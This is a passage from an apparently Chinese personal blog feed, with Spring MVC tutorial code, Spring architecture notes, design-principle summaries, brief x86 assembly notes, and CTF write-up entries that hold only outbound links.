  <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>javax.servlet<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>servlet-api<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>            <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>$&#123;servlet.api.version&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.projectlombok<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>lombok<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>            <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.18.24<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.slf4j<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>slf4j-api<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>            <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.7.36<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>ch.qos.logback<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>logback-classic<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>            <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.2.11<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>    <span class="hljs-tag">&lt;/<span class="hljs-name">dependencies</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">project</span>&gt;</span></code></pre></div></li><li><p>配置web.xml</p><div class="code-wrapper"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">web-app</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;http://xmlns.jcp.org/xml/ns/javaee&quot;</span></span><span class="hljs-tag">         <span class="hljs-attr">xmlns:xsi</span>=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span><span class="hljs-tag">         <span class="hljs-attr">xsi:schemaLocation</span>=<span class="hljs-string">&quot;http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd&quot;</span></span><span class="hljs-tag">         <span class="hljs-attr">version</span>=<span class="hljs-string">&quot;4.0&quot;</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">display-name</span>&gt;</span>luelueking Spring Application<span class="hljs-tag">&lt;/<span class="hljs-name">display-name</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">servlet</span>&gt;</span>        <span class="hljs-tag">&lt;<span class="hljs-name">servlet-name</span>&gt;</span>mymvc<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-name</span>&gt;</span>        <span class="hljs-tag">&lt;<span class="hljs-name">servlet-class</span>&gt;</span>com.czh.spring.framework.webmvc.servlet.MyDispatcherServlet<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-class</span>&gt;</span>        <span class="hljs-tag">&lt;<span class="hljs-name">init-param</span>&gt;</span>            <span class="hljs-tag">&lt;<span class="hljs-name">param-name</span>&gt;</span>contextConfigLocation<span class="hljs-tag">&lt;/<span class="hljs-name">param-name</span>&gt;</span>            <span class="hljs-tag">&lt;<span class="hljs-name">param-value</span>&gt;</span>classpath:application.properties<span class="hljs-tag">&lt;/<span class="hljs-name">param-value</span>&gt;</span>        <span class="hljs-tag">&lt;/<span class="hljs-name">init-param</span>&gt;</span>        <span class="hljs-tag">&lt;<span class="hljs-name">load-on-startup</span>&gt;</span>1<span class="hljs-tag">&lt;/<span class="hljs-name">load-on-startup</span>&gt;</span>    <span class="hljs-tag">&lt;/<span class="hljs-name">servlet</span>&gt;</span>        <span class="hljs-tag">&lt;<span class="hljs-name">servlet-mapping</span>&gt;</span>        <span class="hljs-tag">&lt;<span class="hljs-name">servlet-name</span>&gt;</span>mymvc<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-name</span>&gt;</span>        <span class="hljs-tag">&lt;<span class="hljs-name">url-pattern</span>&gt;</span>/*<span class="hljs-tag">&lt;/<span class="hljs-name">url-pattern</span>&gt;</span>    <span class="hljs-tag">&lt;/<span class="hljs-name">servlet-mapping</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">web-app</span>&gt;</span></code></pre></div></li><li><p>创建servlet作为MVC的入口</p><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.czh.spring.framework.webmvc.servlet;<span class="hljs-keyword">import</span> javax.servlet.ServletConfig;<span class="hljs-keyword">import</span> javax.servlet.ServletException;<span class="hljs-keyword">import</span> javax.servlet.http.HttpServlet;<span class="hljs-keyword">import</span> javax.servlet.http.HttpServletRequest;<span class="hljs-keyword">import</span> javax.servlet.http.HttpServletResponse;<span class="hljs-keyword">import</span> java.io.IOException;<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MyDispatcherServlet</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">HttpServlet</span> &#123;    <span class="hljs-meta">@Override</span>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doGet</span><span class="hljs-params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="hljs-keyword">throws</span> ServletException, IOException &#123;        <span class="hljs-built_in">super</span>.doGet(req, resp);    &#125;    <span class="hljs-meta">@Override</span>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doPost</span><span class="hljs-params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="hljs-keyword">throws</span> ServletException, IOException &#123;        <span class="hljs-built_in">super</span>.doPost(req, resp);    &#125;    <span class="hljs-meta">@Override</span>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">init</span><span class="hljs-params">(ServletConfig config)</span> <span class="hljs-keyword">throws</span> ServletException &#123;        <span class="hljs-built_in">super</span>.init(config);    &#125;&#125;</code></pre></div></li><li><p>在来点注解（注意Target作用域）</p><p><img src="https://img-blog.csdnimg.cn/c9bd1fdd6f874383a92427b052f3f3ce.png" alt="请添加图片描述"></p><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-meta">@Target(&#123;ElementType.FIELD&#125;)</span><span class="hljs-meta">@Retention(RetentionPolicy.RUNTIME)</span><span class="hljs-meta">@Documented</span><span class="hljs-keyword">public</span> <span class="hljs-meta">@interface</span> MyAutowired &#123;String <span class="hljs-title function_">value</span><span class="hljs-params">()</span> <span class="hljs-keyword">default</span> <span class="hljs-string">&quot;&quot;</span>;&#125;<span class="hljs-meta">@Target(&#123;ElementType.TYPE&#125;)</span><span class="hljs-meta">@Retention(RetentionPolicy.RUNTIME)</span><span class="hljs-meta">@Documented</span><span class="hljs-keyword">public</span> <span class="hljs-meta">@interface</span> MyController &#123;String <span class="hljs-title function_">value</span><span class="hljs-params">()</span> <span class="hljs-keyword">default</span> <span class="hljs-string">&quot;&quot;</span>;&#125;<span class="hljs-meta">@Target(&#123;ElementType.METHOD,ElementType.TYPE&#125;)</span><span class="hljs-meta">@Retention(RetentionPolicy.RUNTIME)</span><span class="hljs-meta">@Documented</span><span class="hljs-keyword">public</span> <span class="hljs-meta">@interface</span> MyRequestMapping &#123;String <span class="hljs-title function_">value</span><span class="hljs-params">()</span> <span class="hljs-keyword">default</span> <span class="hljs-string">&quot;&quot;</span>;&#125;<span class="hljs-meta">@Target(ElementType.PARAMETER)</span><span class="hljs-meta">@Retention(RetentionPolicy.RUNTIME)</span><span class="hljs-meta">@Documented</span><span class="hljs-keyword">public</span> <span class="hljs-meta">@interface</span> MyRequestParam &#123;String <span class="hljs-title function_">value</span><span class="hljs-params">()</span> <span class="hljs-keyword">default</span> <span class="hljs-string">&quot;&quot;</span>;<span class="hljs-type">boolean</span> <span class="hljs-title function_">required</span><span class="hljs-params">()</span> <span class="hljs-keyword">default</span> <span class="hljs-literal">true</span>;&#125;<span class="hljs-meta">@Target(&#123;ElementType.TYPE&#125;)</span><span class="hljs-meta">@Retention(RetentionPolicy.RUNTIME)</span><span class="hljs-meta">@Documented</span><span class="hljs-keyword">public</span> <span class="hljs-meta">@interface</span> MyService &#123;String <span class="hljs-title function_">value</span><span class="hljs-params">()</span> <span class="hljs-keyword">default</span> <span class="hljs-string">&quot;&quot;</span>;&#125;</code></pre></div></li></ul>]]></content>
    
    
    <categories>
      
      <category>手写spring</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>暑假最后几天！肝爆（手写）一个Spring之Day1</title>
    <link href="/2022/08/14/spring_day01/"/>
    <url>/2022/08/14/spring_day01/</url>
    
    <content type="html"><![CDATA[<h1 id="Day01—Spring预热"><a href="#Day01—Spring预热" class="headerlink" title="Day01—Spring预热"></a>Day01—Spring预热</h1><p>不废话，直接进入正文！！！</p><p>[TOC]</p><h2 id="Spring的设计初衷"><a href="#Spring的设计初衷" class="headerlink" title="Spring的设计初衷"></a>Spring的设计初衷</h2><ul><li>根本使命：<strong>简化开发</strong></li><li>4个关键策略（如何完成使命）：<ul><li>基于POJO的轻量级和最小侵入性编程</li><li>通过依赖注入和面向接口实现松耦合</li><li>基于切面和惯性进行声明式编程</li><li>通过切面和模版减少样版式代码</li></ul></li><li>通过面相Bean(BOP)、依赖注入(DI)及面向切面(AOP)这三种方式兑现吹过的🐮</li></ul><h2 id="Spring的系统架构"><a href="#Spring的系统架构" class="headerlink" title="Spring的系统架构"></a>Spring的系统架构</h2><ul><li><p>核心容器</p><ul><li>spring-beans和spring-core：spring的核心模块，包含了控制反转（IoC）和依赖注入（DI）。<ul><li>BeanFactory用IoC对应用程序的配置和依赖性规范与实际的应用程序代码进行分离。</li><li>注：BeanFactory实例化后并不会实例化Bean</li></ul></li><li>spring-context：构建于核心模块之上，扩展了BeanFactory，为它添加了Bean生命周期控制、框架事件体系及资源加载透明化等功能。<ul><li>ApplicationContext是该模块的核心接口，其超类是BeanFactory,不同点在于ApplicationContext实例化后自动化对所有的单实例Bean进行实例化与依赖关系的装配，使之处于待用状态。</li></ul></li><li>Spring-context-support：对SpringIoC容器及IoC子容器的扩展支持</li><li>Spring-context-indexer：Spring类的管理组件和Classpath扫描组件</li><li>Spring-expression：统一表达式语言(EL)的扩展，可以查询、管理运行中的对象，同时也可以方便的调用对象方法、以及操作数组、集合等。</li></ul></li><li><p>AOP和设备支持</p><ul><li>spring-aop：另一个核心模块，AOP主要实现模块。</li><li>spring-aspects：集成自AspectJ框架，主要为Sping提供多种AOP实现方法。</li><li>spring-instrument：基于JavaSE中的java.lang.instrument进行设计的,应该算是AOP的一个支援模块，主要作用是JVM启用时生成的一个代理类。</li></ul></li><li><p>数据访问与集成</p><ul><li>spring-jdbc：Spring提供的JDBC抽象框架的主要实现模块，用于简化Spring JDBC操作。</li><li>spring-tx：Spring JDBC事务控制实现模块。</li><li>spring-orm：ORM框架支持模块，主要集成Hibernate,Java Persistence API(JPA)和Java Data Objects(JDO)用于资源管理、数据访问对象的实现和事务策略。</li><li>spring-oxm：提供一个抽象层以支撑OXM（Object和XML的映射）</li><li>spring-jms：能够发送和接受信息</li></ul></li><li><p>Web组件</p><ul><li>spring-web：Spring提供的最基础的Web支持，主要简历在核心容器之上，通过Servlet或者Listeners来初始化Ioc容器，也包含一些与Web相关的支持。</li><li>spring-webmvc：Spring MVC</li><li>spring-websocket：与Web前端进行全双工通信的协议。</li><li>spring-webflux：一个新的非堵塞函数式Reactive Web框架，可以用来构建异步的、非阻塞的、事件驱动的服务、扩展性非常好。</li></ul></li><li><p>通信报文</p><ul><li>spring-message：为Spring框架集成一些基础的报文传送应用。</li></ul></li><li><p>集成测试</p><ul><li>spring-test：提供测试支持</li></ul></li><li><p>集成兼容</p><ul><li>spring-framework-bom：主要解决Spring的不同模块依赖版本不同的问题</li></ul></li><li><p>模块之间依赖关系</p><p><img src="https://img-blog.csdnimg.cn/04b5b226e7174b52bc02410275c9975b.png" alt="在这里插入图片描述"></p></li></ul><h2 id="Spring-IoC运行时序"><a href="#Spring-IoC运行时序" class="headerlink" title="Spring IoC运行时序"></a>Spring IoC运行时序</h2><ul><li>IoC回顾：Inversion of Control 控制反转，就是把原来代码里需要实现的对象创建、依赖，反转给容器帮忙实现。</li></ul><p><img src="https://img-blog.csdnimg.cn/a1982e05ee9e4b5d833d511a717e5658.png" alt="在这里插入图片描述"></p><ul><li>这里我画了一张详细的时序图</li><li>简单概括就是三个基本步骤：<ul><li>初始化的入口由容器实现中的refresh()方法完成调用</li><li>对Bean定义载入IoC容器使用的方法是loadBeanDefinition()</li><li>注册之后就可以通过BeanFactory和ApplicationContext来享受SpringIoC的服务了</li></ul></li></ul><h2 id="Spring-DI运行时序"><a href="#Spring-DI运行时序" class="headerlink" title="Spring DI运行时序"></a>Spring DI运行时序</h2><ul><li><p>DI回顾：Dependency Injection 依赖注入</p></li><li><p>DI发生的时间：</p><ul><li>用户第一次调用getBean()方法时,IoC容器触发依赖注入</li><li>当用户在配置文件中将<bean>元素配置了lay-init&#x3D;false属性是，即让容器在解析注册Bean定义时进行预实例化，触发依赖注入（延时加载：可以提高第一次获取Bean的性能）</bean></li></ul></li><li><p>主要分为二个步骤：</p><ul><li>调用createBeanInstance()方法生成Bean所包含的Java对象实例</li><li>调用populateBean()方法对Bean属性的依赖注入进行处理</li></ul></li><li><p>IoC容器是如何将属性值注入Bean实例对象上的：</p><ul><li>对于集合类型的属性，将属性值解析为目标类型的结合后直接赋值给属性</li><li>对于非集合类型的属性，大量使用JDK的反射机制，通过属性的getter()方法获取指定属性注入前的值，同时调用属性的setter()方法为属性设置注入后的值</li></ul></li><li><p>详细时序图</p></li></ul><p><img src="https://img-blog.csdnimg.cn/c8b884c87f424dfdab7097d4504ae8a5.png" alt="在这里插入图片描述"></p><h2 id="Spring-AOP时序"><a href="#Spring-AOP时序" class="headerlink" title="Spring AOP时序"></a>Spring AOP时序</h2><ul><li>AOP回顾：Aspect Oriented Programming 面向切面编程，可以通过预编译和运行时的动态代理，实现在不修改源代码的情况下给程序动态统一添加功能。</li><li>大致步骤：<ul><li>BeanPostProcessor初始化</li><li>选择代理策略</li><li>调用代理方法</li><li>触发通知</li></ul></li></ul><p><img src="https://img-blog.csdnimg.cn/f6808948e2d946c3bd20a8dd57a31b5e.png" alt="在这里插入图片描述"></p><h2 id="Spring-MVC时序"><a href="#Spring-MVC时序" class="headerlink" title="Spring MVC时序"></a>Spring MVC时序</h2><ul><li><p>一张经典图片回顾mvc的请求处理流程：</p></li><li><p><img src="https://img-blog.csdnimg.cn/2020072519232190.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MTMwMDQzNw==,size_16,color_FFFFFF,t_70" alt="img"></p></li><li><p>九大组件：</p><ul><li>HandlerMapping：用来查找Handler的，也就是处理器，可以是类也可以是方法。<ul><li>例子：标注了***@RequestMapping***的每个方法就可以看成一个Handler。</li><li>作用：找到请求对应的处理器Handler和Interceptor</li></ul></li><li>HandlerAdapter：适配器，因为Handler形式任意，但请求交给Servlet的方法节后都是doService(HttpServletRequest req,HttpServletResponse res)形式的，终究适配过程就是靠它。</li><li>HandlerExceptionResolver：处理Handler产生的异常情况的组件</li><li>ViewResolver：视图解析器。<ul><li>核心方法：resolveViewName(),一个参数是String类型ViewName，另一个是Locale</li><li>作用：将String类型的视图名和Locale解析为View类型的视图</li><li>默认情况下，会为我们自动配置一个InternalResourceViewResolver</li></ul></li><li>RequestToViewNameTranslator:从请求中获取ViewName。因为ViewResolver根据ViewName查找View，但有些Handler处理完成之后没有设置View和ViewName。</li><li>LocaleReslover：从请求中解析Locale。</li><li>ThemeResolver：解析主题的。</li><li>MultipartReslover：处理上传请求，通过将普通的请求包装成MultipartHttpServletRequest来实现（使其可以上传文件等等）。</li><li>FlashMapManager：管理FlashMap。<ul><li>什么是FlashMap：用于重定向时的参数传递</li></ul></li></ul></li><li><p>大致步骤可分为三步：</p><ul><li>ApplicationContext初始化时用Map保存所有的URL和Controller类的对应关系。</li><li>根据请求URL找到对应的Controller，并从Controller中找到处理请求的方法。</li><li>将Request参数绑定到方法的参数上，执行方法处理请求，并返回结果视图。</li></ul></li><li><p>时序图(画的好累🤮，但是为了职业素养)</p></li></ul><p><img src="https://img-blog.csdnimg.cn/1b8736233c2d4144bbdea5d88e5c5b58.png" alt="在这里插入图片描述"></p>]]></content>
    
    
    <categories>
      
      <category>手写spring</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>设计模式</title>
    <link href="/2022/08/14/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/"/>
    <url>/2022/08/14/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/</url>
    
    <content type="html"><![CDATA[<h1 id="设计模式（updating）"><a href="#设计模式（updating）" class="headerlink" title="设计模式（updating）"></a>设计模式（updating）</h1><p>[TOC]</p><h2 id="1-工厂模式"><a href="#1-工厂模式" class="headerlink" title="1.工厂模式"></a>1.工厂模式</h2><h2 id="2-单例模式"><a href="#2-单例模式" class="headerlink" title="2.单例模式"></a>2.单例模式</h2><h2 id="3-原型模式"><a href="#3-原型模式" class="headerlink" title="3.原型模式"></a>3.原型模式</h2><h2 id="4-代理模式"><a href="#4-代理模式" class="headerlink" title="4.代理模式"></a>4.代理模式</h2><h2 id="5-委派模式"><a href="#5-委派模式" class="headerlink" title="5. 委派模式"></a>5. 委派模式</h2><h2 id="6-策略模式"><a href="#6-策略模式" class="headerlink" title="6.策略模式"></a>6.策略模式</h2><h2 id="7-模版模式"><a href="#7-模版模式" class="headerlink" title="7.模版模式"></a>7.模版模式</h2><h2 id="8-适配器模式"><a href="#8-适配器模式" class="headerlink" title="8.适配器模式"></a>8.适配器模式</h2><h2 id="9-装饰者模式"><a href="#9-装饰者模式" class="headerlink" title="9.装饰者模式"></a>9.装饰者模式</h2><h2 id="10-观察者模式"><a href="#10-观察者模式" class="headerlink" title="10.观察者模式"></a>10.观察者模式</h2>]]></content>
    
    
    <categories>
      
      <category>开发</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>软件架构设计原则迅速回忆</title>
    <link href="/2022/08/13/%E8%BD%AF%E4%BB%B6%E6%9E%B6%E6%9E%84%E8%AE%BE%E8%AE%A1%E5%8E%9F%E5%88%9B/"/>
    <url>/2022/08/13/%E8%BD%AF%E4%BB%B6%E6%9E%B6%E6%9E%84%E8%AE%BE%E8%AE%A1%E5%8E%9F%E5%88%9B/</url>
    
    <content type="html"><![CDATA[<h1 id="软件架构设计原则"><a href="#软件架构设计原则" class="headerlink" title="软件架构设计原则"></a>软件架构设计原则</h1><h2 id="1-开闭原则"><a href="#1-开闭原则" class="headerlink" title="1.开闭原则"></a>1.开闭原则</h2><ul><li><p>是什么：开闭原则就是指一个软件实体应该对库欧战开放,对修改关闭。</p></li><li><p>为什么：提高软件系统的可复合性及可维护性。指导我们如何建立稳定、灵活的系统。</p></li><li><p>怎么做：</p><ul><li><p>例如版本更新，我们应尽可能不修改源代码，但是可以新增功能</p></li><li><p>稍微具体的例子：类实现了接口，那么我们想扩展其功能的时候，作一个实现了接口的类的子类就是个不错的方式。</p></li></ul></li></ul><h2 id="2-依赖倒置原则"><a href="#2-依赖倒置原则" class="headerlink" title="2.依赖倒置原则"></a>2.依赖倒置原则</h2><ul><li>是什么：细节依赖抽象</li><li>简单来说就是面向接口编程，先顶层再细节设计代码结构</li></ul><h2 id="3-单一职责原则"><a href="#3-单一职责原则" class="headerlink" title="3.单一职责原则"></a>3.单一职责原则</h2><ul><li>是什么：不要存在多于一个导致类变更的原因。</li><li>为什么：解藕</li></ul><h2 id="4-接口隔离原则"><a href="#4-接口隔离原则" class="headerlink" title="4.接口隔离原则"></a>4.接口隔离原则</h2><ul><li>是什么：用多个专门的接口，客户端不应该依赖它不需要的接口</li><li>怎么做：<ul><li>一个类对应另一个类的依赖应该建立在最小的接口之上</li><li>建立单一接口，不要建立庞大臃肿的接口</li><li>尽量细化接口，接口中的方法尽量少，不是越少越好</li></ul></li></ul><h2 id="5-迪米特原则（最少知道原则）"><a href="#5-迪米特原则（最少知道原则）" class="headerlink" title="5.迪米特原则（最少知道原则）"></a>5.迪米特原则（最少知道原则）</h2><ul><li>是什么：一个对象应该对其他对象保持最少的了解</li><li>为什么：降低耦合</li><li>强调：只和朋友交流，不和陌生人说话。出现在成员变量、方法的输入、输出参数中的类都可以称之为朋友类，反之不是。</li></ul><h2 id="6-里氏替换原则"><a href="#6-里氏替换原则" class="headerlink" title="6.里氏替换原则"></a>6.里氏替换原则</h2><ul><li>一句话：子类可以扩展父类的功能，但不能改变父类的原有功能</li><li>为什么：约束继承泛滥，加强程序健壮性</li><li>怎么做：<ul><li>子类可以实现父类的抽象方法，但不能覆盖父类的非抽象方法。</li><li>子类可以增加自己特有的方法。</li><li>当子类的方法重载父类的方法时，方法的前置条件（方法的输入&#x2F;参数）要比父类方法的输入参数更宽松</li><li>当子类实现父类方法时，方法的后置条件（方法的输出&#x2F;返回值）要比父类更严格或与父类一样</li></ul></li></ul><h2 id="7-合成复用原则"><a href="#7-合成复用原则" class="headerlink" title="7.合成复用原则"></a>7.合成复用原则</h2><ul><li><p>是什么：尽量使用对象组合&#x2F;聚合而不是继承关系达到软件复用的目的。</p></li><li><p>为什么：可以使系统更加灵活</p></li><li><p>怎么做：来个例子（以数据库为例）</p><ul><li><div class="code-wrapper"><pre><code class="java">public class DBConnection&#123;    public String getConnection()&#123;    return &quot;Mysql数据库连接&quot;;  &#125;&#125;<pre><code class="hljs csharp">- ```java  <span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title">ProductDao</span>&#123;    <span class="hljs-keyword">private</span> DBConnection dbConnection;<span class="hljs-comment">//这里就体现了合成复用原则</span>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setDbConnection</span>(<span class="hljs-params">DBConnection dbConnection</span>)</span>&#123;      <span class="hljs-keyword">this</span>.dbConnection = dbConnection;    &#125;    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">addProduct</span>()</span>&#123;      String conn = dbConnection.getConnection();      System.<span class="hljs-keyword">out</span>.println(<span class="hljs-string">&quot;使用&quot;</span>+cnn+<span class="hljs-string">&quot;增加产品&quot;</span>);    &#125;  &#125;</code></pre></div></code></pre></li><li><p>当然有些违背了其他原则，但为了突出合成复用原则，这里不做扩展。实际开发过程中，也不必刻意追求完美，学会平衡取舍，写出优雅。</p></li></ul></li></ul>]]></content>
    
    
    <categories>
      
      <category>开发</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2022/08/10/CTF_show_Web%E5%85%A5%E9%97%A8_phpCVE/"/>
    <url>/2022/08/10/CTF_show_Web%E5%85%A5%E9%97%A8_phpCVE/</url>
    
    <content type="html"><![CDATA[]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>CTF_show_Web入门_nodejs</title>
    <link href="/2022/07/31/CTF_show_Web%E5%85%A5%E9%97%A8_nodejs/"/>
    <url>/2022/07/31/CTF_show_Web%E5%85%A5%E9%97%A8_nodejs/</url>
    
    <content type="html"><![CDATA[<p><a href="http://118.178.126.49/blogs/CTF_show_Web%E5%85%A5%E9%97%A8_nodejs.html">http://118.178.126.49/blogs/CTF_show_Web入门_nodejs.html</a></p>]]></content>
    
    
    <categories>
      
      <category>ctfshow</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2022/07/30/%E6%B1%87%E7%BC%96/"/>
    <url>/2022/07/30/%E6%B1%87%E7%BC%96/</url>
    
    <content type="html"><![CDATA[<h1 id="汇编"><a href="#汇编" class="headerlink" title="汇编"></a>汇编</h1><hr><ul><li><p>i++</p><div class="code-wrapper"><pre><code class="hljs x86asm"><span class="hljs-keyword">xor</span> <span class="hljs-built_in">eax</span>, <span class="hljs-built_in">eax</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">eax</span>, <span class="hljs-number">10</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">ebx</span>, <span class="hljs-built_in">eax</span><span class="hljs-keyword">inc</span> <span class="hljs-built_in">eax</span></code></pre></div></li><li><p>++i</p><div class="code-wrapper"><pre><code class="hljs x86asm"><span class="hljs-keyword">xor</span> <span class="hljs-built_in">eax</span>, <span class="hljs-built_in">eax</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">eax</span>, <span class="hljs-number">10</span><span class="hljs-keyword">inc</span> <span class="hljs-built_in">eax</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">ebx</span>, <span class="hljs-built_in">eax</span></code></pre></div></li></ul><hr><ul><li>call</li><li>jmp</li><li>ret</li><li>sub剪</li><li>lea 取 &amp;</li></ul><hr><ul><li>&#96;&#96;&#96;c<br>int show(int a, int b) {<br>if (a &gt; b) return 10;<br>else return 20;<br>}<div class="code-wrapper"><pre><code class="hljs x86asm">- <span class="hljs-string">```</span><span class="hljs-symbol">  show:</span>  <span class="hljs-keyword">push</span> <span class="hljs-built_in">ebp</span>  <span class="hljs-keyword">mov</span> <span class="hljs-built_in">ebp</span>, <span class="hljs-built_in">esp</span>     <span class="hljs-comment">;开辟栈帧</span>    <span class="hljs-comment">;这二行代码之间，寄存器可以随便用</span>  <span class="hljs-keyword">push</span> <span class="hljs-built_in">si</span>    <span class="hljs-comment">;怎么取到传入的参数</span>  <span class="hljs-keyword">mov</span> <span class="hljs-built_in">bx</span>, [<span class="hljs-built_in">bp</span>+<span class="hljs-number">2</span>*<span class="hljs-number">3</span>]<span class="hljs-comment">;第二个参数</span>  <span class="hljs-keyword">mov</span> <span class="hljs-built_in">ax</span>, [ap+<span class="hljs-number">2</span>*<span class="hljs-number">2</span>]<span class="hljs-comment">;第一个参数</span>    <span class="hljs-keyword">cmp</span> <span class="hljs-built_in">ax</span>, <span class="hljs-built_in">bx</span>  <span class="hljs-keyword">jg</span> .greather<span class="hljs-symbol">  </span><span class="hljs-symbol">  </span><span class="hljs-symbol">  .greather:</span>  <span class="hljs-keyword">mov</span> <span class="hljs-built_in">eax</span>, <span class="hljs-number">10</span><span class="hljs-symbol">  </span><span class="hljs-symbol">  </span><span class="hljs-symbol">  .return:</span>  <span class="hljs-keyword">pop</span> <span class="hljs-built_in">si</span>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">esp</span>, <span class="hljs-built_in">ebp</span>  <span class="hljs-keyword">pop</span> <span class="hljs-built_in">ebp</span><span class="hljs-comment">;这二句等同于leave</span>    <span class="hljs-keyword">ret</span></code></pre></div></li></ul>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>CTF_show_Web入门_SSRF</title>
    <link href="/2022/07/26/CTF_show_Web%E5%85%A5%E9%97%A8_SSRF/"/>
    <url>/2022/07/26/CTF_show_Web%E5%85%A5%E9%97%A8_SSRF/</url>
    
    <content type="html"><![CDATA[<p><a href="http://118.178.126.49/blogs/CTF_show_Web%E5%85%A5%E9%97%A8_SSRF.html">http://118.178.126.49/blogs/CTF_show_Web入门_SSRF.html</a></p>]]></content>
    
    
    <categories>
      
      <category>ctfshow</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>CTF_show_Web入门_XSS</title>
    <link href="/2022/07/24/CTF_show_Web%E5%85%A5%E9%97%A8_XSS/"/>
    <url>/2022/07/24/CTF_show_Web%E5%85%A5%E9%97%A8_XSS/</url>
    
    <content type="html"><![CDATA[<p><a href="http://118.178.126.49/blogs/CTF_show_Web%E5%85%A5%E9%97%A8_XSS.html">http://118.178.126.49/blogs/CTF_show_Web入门_XSS.html</a></p>]]></content>
    
    
    <categories>
      
      <category>ctfshow</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>CTF_show_Web入门_sql注入</title>
    <link href="/2022/07/21/CTF_show_Web%E5%85%A5%E9%97%A8_sql%E6%B3%A8%E5%85%A5/"/>
    <url>/2022/07/21/CTF_show_Web%E5%85%A5%E9%97%A8_sql%E6%B3%A8%E5%85%A5/</url>
    
